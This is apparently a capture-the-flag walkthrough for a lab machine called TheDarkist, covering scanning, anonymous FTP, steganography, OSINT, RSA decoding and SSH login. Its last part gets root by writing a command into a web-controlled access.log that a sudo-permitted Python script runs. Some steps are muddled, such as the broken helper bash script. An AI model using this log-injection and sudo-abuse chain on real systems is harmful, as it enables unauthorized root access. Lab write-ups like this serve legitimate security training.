# Exploitation Guide for TheDarkist

## Enumeration   (Mitre Reconnaissance ID: T1593) 


We Start with a simple nmap scan 

nmap -sV -T4  -p-   192.168.221.138



Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-22 21:21 India Standard Time

Nmap scan report for 192.168.221.138
Host is up (0.0010s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.5
22/tcp open   ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open   http     Apache httpd 2.4.52 ((Ubuntu))
MAC Address: 00:0C:29:D7:5A:DC (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.14 seconds



# FTP ANONYMOUS ACCESS (ID: S0095)

We see that the port 22 is open the First thing that come to mind is anonyous login

so we try: 

ftp 192.168.221.138
Connected to 192.168.221.138.
220 (vsFTPd 3.0.5)
Name (192.168.221.138:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

AND Hey! We are in:   


lets check directory listing
ftp> ls
229 Entering Extended Passive Mode (|||56811|)


We see the server hangs , Which is a problem

After searching for A while we found that we have to issue the command "passive"
to fix this error.


so now

Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0         1048620 Dec 22 00:59 AbsolutelyEmptyAndUselessAudio.wav
226 Directory send OK.
ftp> 


so now we see we can issue the ls command:

ftp>  get AbsolutelyEmptyAndUselessAudio.wav


we get the only file available to us 
seems loke some audio with no hint  so there may be steganography

# After trying few tools we find steghide useful :

steghide extract -sf  AbsolutelyEmptyAndUselessAudio.wav
Enter passphrase: 

wrote extracted data to "need_BIT_attention.png".

we don't give any passsphrase but we find a image : need_BIT_attention.png


lets try some more stego   , 


opened the image deep message with go inside may mean stego
again used steghide but no use   


the name says "ned BIT more attention"


may be related to image bit planes 

lets use :  https://stegonline.georgeom.net/upload       //there are many tool available but  we will use one of the best tool for image steganography



we upload the image and browse the bit planes and WOAH!  one of the bit planes conatain the password except thhe last two characters

Hmm!
# OSINT GATHERING FROM SOCIAL MEDIA (ID: T1589)

we have seen that HTTP was also open on port 80

so we go to that :
we a a portfolio page of a person name "Ghyophoggua"


we browsed for a while then move on to the obvious step  that is viewing page source

there we find a cooment:

"#check out my twitter/medium.com     @lihoxo4588 where I give tips on subjects I have no Idea about"


we try to search the user on twitter but no use

then we tried to find him on medium but didn't find



then we tried twitter direct link   : twitter.com/lihoxo4588

but no use 

then we use medium direct link : medium.com/@lihoxo4588 

and Hey! We  found some article


Here Ghyophoggua 

has decribed his personal directory listing technique maybe he must have user it in his website too!

we go to   192.168.221.138/Ghyophoggua1

and it opened with more directory in it , we seach all but found nothing

so now we try 192.168.221.138/Ghyophoggua2


continuing with this after some time

we find a text thisIsForMatt.txt  in Ghyophoggua7/Ghyophoggua7



we find some n e and cipher value 
hmm!  ya it might be RSA encryption


we crack the code using decode.fr /RsaCtfTool   or any other tool


we get the value 3636

which is ASCII for $$

so here we get the last two character of password



# Exploitation     (Mitre ID: T1078)

we have also seen there is SSH port 22 open so

we try to coonect 
ssh Ghyophoggua@192.168.221.138

we give the password we find


and walla we are in!


# Priviledge escalation 

# Misconfigured SUID Binary(ID: T1548.001)


we search for some common misconfiguration and stuff

we find nothing much
so we tried   
sudo -l              # command

we see we have some special privileges


#                                     #

Matching Defaults entries for Ghyophoggua on darkist:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User Ghyophoggua may run the following commands on darkist:
    (root) NOPASSWD: /usr/bin/python3* /home/Ghyophoggua/dark.py



so we can use /usr/bin/python3 to run /home/Ghyophoggua/dark.py


so we open up the program  named dark.py   which also has SUID bit set

on analysing we found it is scraping some access.log 's last line from /var/www/html/zikimokbaka/yakayaz/access.log
and executing it on command line

so we guess since it is inside /var/www    folder it may be a directory

# SPECIAL PRIVILEGE TO CERTAIN FILE/PROGRAM IN SUDOER FILE(ID: T1548.003),Log Injection-Tampering-Forging (CAPEC-93)

we go to
http://192.168.221.138/zikimokbaka/yakayaz/

we find two file there

access.log   and access.php


we cd to the directory and analyze the php

we see it is taking the input from user and saving it to access.log as sentence


so we see that we can control the command we execute from here

so here we can try to use the python file by creating a local module named subprocess 
but we find out wring to the folder is disabled



so now we have to find some writable folder  , we find /var/tmp

as writable so we cd to that directory and make a bash file  


# -----------------------------------------
#!/bin/bash

# Open a new bash shell with root privileges
sudo bash

# Do not drop privileges
 bash m.sh


# ----------------------------------------

we save this as BashScrpt.sh adn give chmod +777 BashScrpt.sh


now we enter we try many character for command injection but most are filtered and sanitized


so at last we eneter bash /var/tmp/BashScrpt.sh

we then execute

sudo /usr/bin/python3* /home/Ghyophoggua/dark.py



and Heyyyyyyyyyyyyyy!!!!!!!   we are root and find flag at /root/proof.txt
 







# ----------------------------------------MITRE MAP-------------------------------------------------------------#

# (Mitre Reconnaissance ID: T1593) 
# FTP ANONYMOUS ACCESS (ID: S0095)
# OSINT GATHERING FROM SOCIAL MEDIA (ID: T1589)
# Exploitation     (Mitre ID: T1078)
# Misconfigured SUID Binary(ID: T1548.001)
# SPECIAL PRIVILEGE TO CERTAIN FILE/PROGRAM IN SUDOER FILE(ID: T1548.003)
# Log Injection-Tampering-Forging (CAPEC-93)

# ---------------------------------------------------------------------------------------------------------------#


















































